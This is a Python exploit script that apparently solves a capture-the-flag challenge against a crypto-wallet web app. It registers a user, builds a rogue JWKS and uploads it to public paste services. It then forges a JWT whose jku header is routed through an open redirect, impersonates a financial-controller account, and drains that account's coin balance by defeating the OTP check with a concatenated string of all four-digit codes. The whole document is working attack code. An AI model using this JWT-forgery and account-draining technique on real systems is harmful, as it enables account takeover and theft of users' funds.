import requests
import jwt
import json
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64

TARGET_IP = "83.136.249.34"
TARGET_PORT = "51790"
BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

# 1. Register and Login to get KID
def get_kid():
    email = f"attacker_{int(time.time())}@example.com"
    password = "password123"
    
    print(f"[*] Registering user {email}...")
    try:
        res = requests.post(f"{BASE_URL}/api/auth/register", json={"email": email, "password": password}, timeout=10)
        if res.status_code != 200:
            # Try login if already exists
            print(f"[*] Registration failed (maybe exists), logging in...")
            res = requests.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password}, timeout=10)
        
        if res.status_code != 200:
            print(f"[-] Failed to authenticate: {res.text}")
            exit(1)
            
        token = res.json()['token']
        header = jwt.get_unverified_header(token)
        kid = header['kid']
        print(f"[+] Got KID: {kid}")
        return kid, email, token
    except Exception as e:
        print(f"[-] Error connecting to server: {e}")
        exit(1)

# 2. Generate Malicious JWKS
def generate_jwks(kid):
    print(f"[*] Generating RSA key pair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    public_key = private_key.public_key()
    
    # Export private key for signing
    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    # Create JWK
    # We need to manually construct the JWK parameters (n, e)
    numbers = public_key.public_numbers()
    n = base64.urlsafe_b64encode(numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('=')
    e = base64.urlsafe_b64encode(numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, byteorder='big')).decode('utf-8').rstrip('=')
    
    jwk = {
        "kty": "RSA",
        "n": n,
        "e": e,
        "alg": "RS256",
        "use": "sig",
        "kid": kid
    }
    
    jwks = {"keys": [jwk]}
    
    return private_key, jwks

# 3. Upload JWKS
def upload_jwks(jwks):
    print(f"[*] Uploading JWKS...")
    # Using transfer.sh
    try:
        res = requests.put("https://transfer.sh/jwks.json", json=jwks, timeout=30)
        if res.status_code == 200:
            url = res.text.strip()
            print(f"[+] Uploaded JWKS to {url}")
            return url
    except Exception as e:
        print(f"[-] transfer.sh failed: {e}")

    # Fallback to paste.rs
    try:
        print(f"[*] Trying paste.rs...")
        res = requests.post("https://paste.rs/", data=json.dumps(jwks), timeout=30)
        if res.status_code in [200, 201]:
            url = res.text.strip()
            print(f"[+] Uploaded JWKS to {url}")
            return url
    except Exception as e:
        print(f"[-] paste.rs failed: {e}")
        
    print("[-] All uploads failed.")
    exit(1)

# 4. Forge Token
def forge_token(private_key, kid, jwks_url, target_email):
    print(f"[*] Forging token for {target_email}...")
    
    # Construct JKU with open redirect
    jku = f"http://127.0.0.1:1337/api/analytics/redirect?url={jwks_url}&ref=exploit"
    
    headers = {
        "kid": kid,
        "jku": jku
    }
    
    payload = {
        "email": target_email,
        "iat": int(time.time())
    }
    
    token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
    return token

# 5. Generate OTP Brute Force String
def generate_otp_string():
    print(f"[*] Generating OTP brute force string...")
    # Simple concatenation of all 4-digit numbers
    # 1000 to 9999
    return "".join([str(i) for i in range(1000, 10000)])

# 6. Exploit
def exploit():
    kid, my_email, _ = get_kid()
    private_key, jwks = generate_jwks(kid)
    jwks_url = upload_jwks(jwks)
    
    target_email = "financial-controller@frontier-board.htb"
    forged_token = forge_token(private_key, kid, jwks_url, target_email)
    
    # Check balance first
    print(f"[*] Checking balance of {target_email}...")
    headers = {"Authorization": f"Bearer {forged_token}"}
    try:
        res = requests.get(f"{BASE_URL}/api/crypto/balance", headers=headers, timeout=10)
        if res.status_code != 200:
            print(f"[-] Failed to get balance: {res.text}")
            # It might be that the token verification failed
            exit(1)
        
        balances = res.json()
        print(f"[+] Balances: {balances}")
        
        clcr_balance = 0
        for coin in balances:
            if coin['symbol'] == 'CLCR':
                clcr_balance = coin['availableBalance']
                break
                
        print(f"[*] CLCR Balance: {clcr_balance}")
        
        if clcr_balance <= 0:
            print("[!] Balance is already 0 or negative.")
        else:
            # Drain wallet
            print(f"[*] Draining {clcr_balance} CLCR to {my_email}...")
            otp_string = generate_otp_string()
            
            data = {
                "to": my_email,
                "coin": "CLCR",
                "amount": clcr_balance,
                "otp": otp_string
            }
            
            res = requests.post(f"{BASE_URL}/api/crypto/transaction", json=data, headers=headers, timeout=60)
            print(f"[*] Transaction response: {res.text}")
            
        # Get Flag
        print(f"[*] Retrieving flag...")
        res = requests.get(f"{BASE_URL}/api/dashboard", headers=headers, timeout=10)
        print(f"[+] Dashboard response: {res.text}")
        
    except Exception as e:
        print(f"[-] Error during exploit: {e}")

if __name__ == "__main__":
    exploit()
